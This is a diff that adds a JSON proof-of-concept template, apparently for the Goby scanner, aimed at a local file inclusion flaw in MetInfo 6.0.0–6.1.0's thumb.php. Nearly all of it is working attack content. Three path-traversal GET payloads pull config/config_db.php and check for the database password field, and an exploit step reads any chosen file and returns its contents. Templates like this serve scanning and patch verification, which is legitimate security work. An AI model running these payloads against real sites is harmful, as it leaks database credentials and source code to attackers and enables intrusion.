@@ -1,0 +1,187 @@
+{
+    "Name": "metinfo thumb.php Local File Inclusion",
+    "Level": "2",
+    "Tags": [
+        "File Inclusion"
+    ],
+    "GobyQuery": "app=\"MetInfo\"",
+    "Description": "MetInfo is a content management system developed using PHP and Mysql. The old_thumb.class.php file in MetInfo 6.0.0~6.1.0 has an arbitrary file reading vulnerability. Attackers can use vulnerabilities to read sensitive files on the website.",
+    "Product": "MetInfo",
+    "Homepage": "https://gobies.org/",
+    "Author": "sharecast.net@gmail.com",
+    "Impact": "<p>Leaking the source code, database configuration files, etc., caused the website to be extremely insecure.</p>",
+    "Recommandation": "<p>update version patch</p>",
+    "References": [
+        "https://paper.seebug.org/676"
+    ],
+    "HasExp": true,
+    "ExpParams": [
+        {
+            "name": "file",
+            "type": "createSelect",
+            "value": "..././http/..././config/config_db.php,http/.....///.....///config/config_db.php,http\\..\\..\\config\\config_db.php",
+            "show": ""
+        }
+    ],
+    "ExpTips": {
+        "Type": "",
+        "Content": ""
+    },
+    "ScanSteps": [
+        "OR",
+        {
+            "Request": {
+                "method": "GET",
+                "uri": "/include/thumb.php?dir=..././http/..././config/config_db.php",
+                "follow_redirect": false,
+                "header": {},
+                "data_type": "text",
+                "data": ""
+            },
+            "ResponseTest": {
+                "type": "group",
+                "operation": "AND",
+                "checks": [
+                    {
+                        "type": "item",
+                        "variable": "$code",
+                        "operation": "==",
+                        "value": "200",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "<?php",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "con_db_pass",
+                        "bz": ""
+                    }
+                ]
+            },
+            "SetVariable": []
+        },
+        {
+            "Request": {
+                "method": "GET",
+                "uri": "/include/thumb.php?dir=http/.....///.....///config/config_db.php",
+                "follow_redirect": false,
+                "header": {},
+                "data_type": "text",
+                "data": ""
+            },
+            "ResponseTest": {
+                "type": "group",
+                "operation": "AND",
+                "checks": [
+                    {
+                        "type": "item",
+                        "variable": "$code",
+                        "operation": "==",
+                        "value": "200",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "<?php",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "con_db_pass",
+                        "bz": ""
+                    }
+                ]
+            },
+            "SetVariable": []
+        },
+        {
+            "Request": {
+                "method": "GET",
+                "uri": "/include/thumb.php?dir=http\\..\\..\\config\\config_db.php",
+                "follow_redirect": false,
+                "header": {},
+                "data_type": "text",
+                "data": ""
+            },
+            "ResponseTest": {
+                "type": "group",
+                "operation": "AND",
+                "checks": [
+                    {
+                        "type": "item",
+                        "variable": "$code",
+                        "operation": "==",
+                        "value": "200",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "<?php",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "con_db_pass",
+                        "bz": ""
+                    }
+                ]
+            },
+            "SetVariable": []
+        }
+    ],
+    "ExploitSteps": [
+        "AND",
+        {
+            "Request": {
+                "method": "GET",
+                "uri": "/include/thumb.php?dir={{{file}}}",
+                "follow_redirect": false,
+                "header": {},
+                "data_type": "text",
+                "data": ""
+            },
+            "ResponseTest": {
+                "type": "group",
+                "operation": "AND",
+                "checks": [
+                    {
+                        "type": "item",
+                        "variable": "$code",
+                        "operation": "==",
+                        "value": "200",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "<?php",
+                        "bz": ""
+                    }
+                ]
+            },
+            "SetVariable": [
+                "output|lastbody"
+            ]
+        }
+    ],
+    "PostTime": "2021-03-27 23:31:09",
+    "GobyVersion": "1.8.237",
+    "PocId": "10175",
+    "Recommendation": ""
+}
